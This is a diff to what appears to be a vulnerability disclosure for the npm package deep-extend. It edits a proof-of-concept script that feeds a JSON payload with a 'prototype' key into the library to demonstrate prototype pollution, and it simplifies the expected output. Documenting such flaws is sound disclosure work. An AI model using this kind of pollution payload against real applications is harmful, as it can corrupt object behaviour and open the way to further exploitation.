@@ -12,11 +12,8 @@ This package allowing for modification of prototype behavior, which may result i
 // poc.js
 var extnd = require('deep-extend');
 var malicious_payload = '{"prototype": {"polluted": "Yes! Polluted"}}';
-
-var a = {};
-console.log("Before : " + a.oops);
 object=extnd({}, JSON.parse(malicious_payload));
-console.log("After : " + object.prototype.polluted);
+console.log(object.prototype.polluted);
 ```
 
 2. Execute the following commands in another terminal:
@@ -28,6 +25,5 @@ node poc.js #  Run the PoC
 
 3. Check the Output:
 ```
-Before : undefined
-After : Yes! Polluted
+Yes! Polluted
 ```
